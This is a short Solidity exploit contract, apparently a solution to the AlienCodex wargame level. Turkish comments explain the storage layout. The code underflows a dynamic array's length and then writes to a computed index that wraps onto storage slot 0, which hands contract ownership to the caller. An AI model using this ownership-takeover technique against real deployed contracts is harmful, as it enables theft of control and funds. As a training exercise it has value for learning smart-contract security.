pragma solidity ^0.8;

interface IAlienCodex {
  function owner() external view returns (address);

  function retract() external;

  function make_contact() external;

  function revise(uint256 i, bytes32 _content) external;
}

/*
    slot 0 - owner (20 bytes), contact (1 byte)
    slot 1 - codex arrayi
    // slot x(array elementlerinin depolandığı slot)= keccak256(arrayin bulunduğu slot)) + index
    // a = keccak256(1)
    slot a + 0 - codex[0] 
    slot a + 1 - codex[1] 
    slot a + 2 - codex[2] 
    slot a + 3 - codex[3] 
    i değerini arıyoruz
    slot a + i = slot 0 olması lazım
    a + i = 0 buradan i = 0 - a
    */

contract Hack {
  constructor(IAlienCodex target) {
    target.make_contact();
    target.retract();

    uint256 a = uint256(keccak256(abi.encode(uint256(1))));
    uint256 i;
    unchecked {
      i -= a;
    }
    target.revise(i, bytes32(uint256(uint160(msg.sender))));
  }
}
